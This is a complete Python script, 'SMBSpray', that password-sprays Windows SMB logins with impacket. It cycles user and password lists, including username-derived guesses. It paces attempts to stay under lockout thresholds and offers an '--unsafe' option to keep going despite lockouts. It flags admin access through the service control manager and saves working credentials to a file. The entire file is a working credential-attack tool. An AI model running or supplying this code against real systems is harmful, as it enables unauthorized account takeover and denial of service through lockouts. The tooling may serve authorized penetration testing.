#!/usr/bin/env python3

import datetime
import argparse
import os
import sys
from impacket.smbconnection import SMBConnection, SessionError
from time import sleep
from termcolor import colored
from math import floor
from concurrent.futures import ThreadPoolExecutor
from impacket.dcerpc.v5.transport import DCERPCTransportFactory, SMBTransport
from impacket.dcerpc.v5 import scmr
import ipaddress
import socket

# log files
spray_logs = "spray_logs.txt"
valid_creds = "valid_creds.txt"
attempted = "attempted_pws.txt"

# smb errors list - stolen from CME
smb_error_status = [
    "STATUS_ACCOUNT_DISABLED",
    "STATUS_ACCOUNT_EXPIRED",
    "STATUS_ACCOUNT_RESTRICTION",
    "STATUS_INVALID_LOGON_HOURS",
    "STATUS_INVALID_WORKSTATION",
    "STATUS_LOGON_TYPE_NOT_GRANTED",
    "STATUS_PASSWORD_EXPIRED",
    "STATUS_PASSWORD_MUST_CHANGE",
    "STATUS_ACCESS_DENIED"
]

# taken from CME
def check_if_admin(conn):
        rpctransport = SMBTransport(conn.getRemoteHost(), 445, r'\svcctl', smb_connection=conn)
        dce = rpctransport.get_dce_rpc()
        try:
            dce.connect()
        except:
            pass
        else:
            dce.bind(scmr.MSRPC_UUID_SCMR)
            try:
                # 0xF003F - SC_MANAGER_ALL_ACCESS
                # http://msdn.microsoft.com/en-us/library/windows/desktop/ms685981(v=vs.85).aspx
                ans = scmr.hROpenSCManagerW(dce,'{}\x00'.format(conn.getRemoteHost()),'ServicesActive\x00', 0xF003F)
                return True
            except scmr.DCERPCException as e:
                return False
                pass
        return

smb_error_locked = "STATUS_ACCOUNT_LOCKED_OUT"

shutdown = False

# function to check if a string is an IP address
def is_ipv4(string):
    try:
        ipaddress.IPv4Network(string)
        return True
    except ValueError:
        return False

# custom exception for lockouts
class Locked(Exception):
    def __init__(self, locked_user):
        self.locked_user = locked_user

# Check if current time is within the allowed time range
def is_within_time_range(current_time, start_time, end_time):
    if start_time < end_time:
        return start_time <= current_time < end_time
    else:  # Over midnight scenario
        return current_time >= start_time or current_time < end_time

# login to smb function
def login(username, password, domain, host, verbose=False):
    # safe way to kill login functionality once exceptions are made
    if shutdown:
        return None
    desc = ""
    with open(spray_logs, "a+") as sf:
        try:
            smbclient = SMBConnection(host, host, sess_port=445)
            if domain:
                conn = smbclient.login(username, password, domain)
            # if domain isn't supplied get it from the server    
            else:
                conn = smbclient.login(username, password, domain)
                domain = smbclient.getServerDNSDomainName()

            if conn:
                hostname = smbclient.getServerDNSHostName()
                is_admin = check_if_admin(smbclient)
                if not is_ipv4(host):
                    ip = socket.gethostbyname(host)
                else:
                    ip = host
                if is_admin:
                    message = get_pretty_time("success") + "{}:{}\t{}{}\\{}:{} ".format(ip,hostname,colored("[+] ","green", attrs=['bold']),domain,username,password) + colored("(ADMIN!)","green", attrs=['bold'])

                else:
                    message = get_pretty_time("success") + "{}:{}\t{}{}\\{}:{} ".format(ip,hostname,colored("[+] ","green", attrs=['bold']),domain,username,password)
                
                with open(valid_creds, "a+") as f:
                    f.write(domain + "\\" + username + ":" + password + "\r\n")

            smbclient.close()
        # impacket smb session error handling
        except SessionError as e:
            error, desc = e.getErrorString()
            hostname = smbclient.getServerDNSHostName()
            if not is_ipv4(host):
                ip = socket.gethostbyname(host)
            else:
                ip = host
            if not domain:
                domain = smbclient.getServerDNSDomainName()
            
            if error in smb_error_status:
                message = get_pretty_time("warn") + "{}:{}\t{}{}\\{}:{} ".format(ip,hostname,colored("[-] ","yellow", attrs=['bold']),domain,username,password) + colored(error,"yellow", attrs=['bold'])
            elif error == smb_error_locked:
                message = get_pretty_time("danger") + "{}:{}\t{}{}\\{}:{} ".format(ip,hostname,colored("[!] ","red", attrs=['bold']),domain,username,password) +  colored(error,"red", attrs=['bold'])
                print(message)
                raise Locked(username)
            else:
                message = get_pretty_time() + "{}:{}\t{}{}\\{}:{} ".format(ip,hostname,colored("[-] ","red", attrs=['bold']),domain,username,password) + error
            smbclient.close()
        print(message)
        if verbose and desc:
                print(desc)
        sf.write(message + "\r\n")

# formats the datetime and colors it
def get_pretty_time(level=None):
    formatted_date = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    if level == "success":
        pretty_time = colored("[+] {}\t\t ".format(formatted_date), "green", attrs=['bold'])
    elif level == "warn":
        pretty_time = colored("[*] {}\t\t ".format(formatted_date), "yellow", attrs=['bold'])
    elif level == "danger":
        pretty_time = colored("[!] {}\t\t ".format(formatted_date), "red", attrs=['bold'])
    else:
        pretty_time = "[-] {}\t\t ".format(formatted_date)
    return pretty_time

# function to spray password
def try_password(users, password, threads, option=None, unsafe=False):
    global shutdown
    global locked_users
    global i
    i += 1
    print(get_pretty_time("warn") + colored("Trying password {} of {}".format(i, total_passwords), "yellow", attrs=['bold']))
    with ThreadPoolExecutor(max_workers=threads) as executor:
        # username as password variation all lowercase
        if option == "lower":
            futures = [
                executor.submit(login, user, user.lower(), domain, host, verbose) 
                for user in users
                ]
            for future in futures:
                try:
                    future.result(timeout=30)
                except Locked as e:
                    locked_users.add(e.locked_user)
                    if not unsafe and len(locked_users) >= 3:
                        executor.shutdown(wait=False)
                        shutdown = True
                        print(colored("[!] Exiting due to locked accounts!", "red",attrs=['bold']))
                        sys.exit()
                except KeyboardInterrupt:
                    executor.shutdown(wait=False)
                    shutdown = True
                    print(colored("[!] Exiting due to keyboard interrupt...", "red",attrs=['bold']))
                    sys.exit()
            check_for_naptime(i)

        # username as password variation all uppercase
        elif option == "upper":
            futures = [
                executor.submit(login, user, user.upper(), domain, host, verbose) 
                for user in users
                ]
            for future in futures:
                try:
                    future.result(timeout=30)
                except Locked as e:
                    locked_users.add(e.locked_user)
                    if not unsafe and len(locked_users) >= 3:
                        executor.shutdown(wait=False)
                        shutdown = True
                        print(colored("[!] Exiting due to locked accounts!", "red",attrs=['bold']))
                        sys.exit()
                except KeyboardInterrupt:
                    executor.shutdown(wait=False)
                    shutdown = True
                    print(colored("[!] Exiting due to keyboard interrupt...", "red",attrs=['bold']))
                    sys.exit()
            check_for_naptime(i)

        # username as password variation captilalize first letter and append !
        elif option == "capital":
            futures = [
                executor.submit(login, user, user.capitalize() + "!", domain, host, verbose) 
                for user in users
                ]
            for future in futures:
                try:
                    future.result(timeout=30)
                except Locked as e:
                    locked_users.add(e.locked_user)
                    if not unsafe and len(locked_users) >= 3:
                        executor.shutdown(wait=False)
                        shutdown = True
                        print(colored("[!] Exiting due to locked accounts!", "red",attrs=['bold']))
                        sys.exit()
                except KeyboardInterrupt:
                    executor.shutdown(wait=False)
                    shutdown = True
                    print(colored("[!] Exiting due to keyboard interrupt...", "red",attrs=['bold']))
                    sys.exit()
            check_for_naptime(i)
            
        # default behavior to try password spray
        else:
            futures = [
                executor.submit(login, user, password, domain, host, verbose) 
                for user in users
                ]
            for future in futures:
                try:
                    future.result(timeout=30)
                except Locked as e:
                    locked_users.add(e.locked_user)
                    if not unsafe and len(locked_users) >= 3:
                        executor.shutdown(wait=False)
                        shutdown = True
                        print(colored("[!] Exiting due to locked accounts!", "red",attrs=['bold']))
                        sys.exit()
                except KeyboardInterrupt:
                    executor.shutdown(wait=False)
                    shutdown = True
                    print(colored("[!] Exiting due to keyboard interrupt...", "red",attrs=['bold']))
                    sys.exit()
            check_for_naptime(i)

# checks to sleep based off attempt try
def check_for_naptime(i):
    if (i % attempts == 0) and (i != total_passwords):
        print(get_pretty_time("warn") + colored("Sleeping for {} minutes".format(lockout_period),"yellow",attrs=['bold']))
        sleep(lockout_period * 60)

def main():
    banner = "\nSMBSpray v1.2\n"
    print(colored(banner,"blue",attrs=['bold']))

    parser = argparse.ArgumentParser(description='Parse Spray Arguments.')
    parser.add_argument('-u', metavar="users", help="User list to spray", type=str)
    parser.add_argument('-U', metavar="user", help="Single user to spray", type=str)
    parser.add_argument('-p', metavar="passwords", help="Password list to spray", type=str)
    parser.add_argument('-P', metavar="password", help="Single password to spray", type=str)
    parser.add_argument('-d', metavar="domain", help="Domain", type=str)
    parser.add_argument('-l', metavar="minutes", help="Lockout policy period in minutes (Default: 30 minutes)", type=int,default=30)
    parser.add_argument('-a', metavar="attempts", help="Number of attempts per lockout period (Default: 1 attempt)", type=int,default=1)
    parser.add_argument('-ip', metavar="IP/hostname", help="IP/hostname to spray", required=True, type=str)        
    parser.add_argument('--threads', metavar="threads", help="Number of threads to run (Default: 5 threads)", type=int,default=5)
    parser.add_argument('--verbose', help="Verbose Mode", action='store_true')
    parser.add_argument('--user_pw', help="Try username variations as password", action='store_true')
    parser.add_argument('--unsafe', help="Keep spraying even if there are multiple account lockouts", action='store_true')
    parser.add_argument('--no-interaction', help="Run without interactive input", action='store_true')
    parser.add_argument('--start-time', metavar="HH:MM", help="Start time for allowed operation", type=str)
    parser.add_argument('--end-time', metavar="HH:MM", help="End time for allowed operation", type=str)
    
    args = parser.parse_args()
    if len(sys.argv) == 1:
        parser.print_help()

    global domain
    global host
    global verbose
    global attempts 
    global total_passwords
    global lockout_period
    global i
    global unsafe
    global locked_users
    global threads
    domain = args.d 
    host = args.ip 
    verbose = args.verbose
    attempts = args.a
    lockout_period = args.l
    unsafe = args.unsafe
    user_list = []
    password_list = []
    locked_users = set()
    threads = args.threads

    if args.start_time and args.end_time:
        start_time = datetime.datetime.strptime(args.start_time, "%H:%M").time()
        end_time = datetime.datetime.strptime(args.end_time, "%H:%M").time()
        current_time = datetime.datetime.now().time()
        while not is_within_time_range(current_time, start_time, end_time):
            print(colored("[*] Outside allowed time range. Waiting... Current time: {}".format(current_time), "yellow", attrs=['bold']))
            sleep(60)  # Check every minute
            current_time = datetime.datetime.now().time()

    i = 0

    if not args.u and not args.U:
        print(colored("[!] No users to spray... exiting", "red", attrs=['bold']))
        sys.exit()
    
    if not args.p and not args.P and not args.user_pw:
        print(colored("[!] No passwords to spray... exiting", "red",attrs=['bold']))
        sys.exit()
    
    if not domain:
        domain = ""

    # append users to list
    if args.u:
        with open(args.u, "r") as user_file:
            for line in user_file:
                user_list.append(line.strip())
    
    # append passwords to list
    if args.p:
        with open(args.p, "r") as password_file:
            for line in password_file:
                password_list.append(line.strip())

    # append single user to list
    if args.U:
        user_list.append(args.U)
    
    # append single password to list
    if args.P:
        password_list.append(args.P)

    # check if password has been attempted from log file, if so remove it
    if os.path.exists(attempted):
        with open(attempted, "r") as pf:
            tried_passwords = pf.read().splitlines()
            for tried_password in tried_passwords:
                if tried_password in password_list:
                    password_list.remove(tried_password)
                    print(colored("[*] {} already attempted, removed from spray list".format(tried_password), "yellow", attrs=['bold']))

    total_passwords = len(password_list)

    # add three total passwords to try for username variations
    if args.user_pw:
        total_passwords += 3
    
    if total_passwords == 0:
        print(colored("[!] No passwords to spray... exiting", "red", attrs=['bold']))
        sys.exit()

    # ugly math for rough estimate of time to completion
    mathz1 = floor((total_passwords / attempts))
    if mathz1 == 1:
        mathz = lockout_period * mathz1
    else:
        mathz = lockout_period * mathz1 - lockout_period

    print(colored("[*] Attempting {} passwords every {} minutes for {} total passwords".format(attempts, lockout_period, total_passwords),"yellow",attrs=['bold']))
    
    if not args.no_interaction:
        if total_passwords <= attempts:
            print(colored("[*] This will run to completion without sleeping", "yellow", attrs=['bold']))
            input(colored("[*] Press Enter to proceed", "yellow", attrs=['bold']))
        else: 
            print(colored("[*] This will take just over {} minutes to complete".format(mathz), "yellow", attrs=['bold']))
            input(colored("[*] Press Enter to proceed", "yellow", attrs=['bold']))

    # do username variations as passwords
    if args.user_pw:
        print(get_pretty_time("warn") + colored("Trying username password variations", "yellow", attrs=['bold']))
        try_password(user_list, "", threads, option="lower", unsafe=unsafe)
        try_password(user_list, "", threads, option="upper", unsafe=unsafe)
        try_password(user_list, "", threads, option="capital", unsafe=unsafe)

    # iterate through passwords list
    if password_list:
        for passwd in password_list:
            try_password(user_list, passwd, threads, unsafe=unsafe)
            # after iterating through all users, write attempted password to file
            with open(attempted, "a+") as pf:
                pf.write(passwd + "\n")

if __name__ == "__main__":
    main()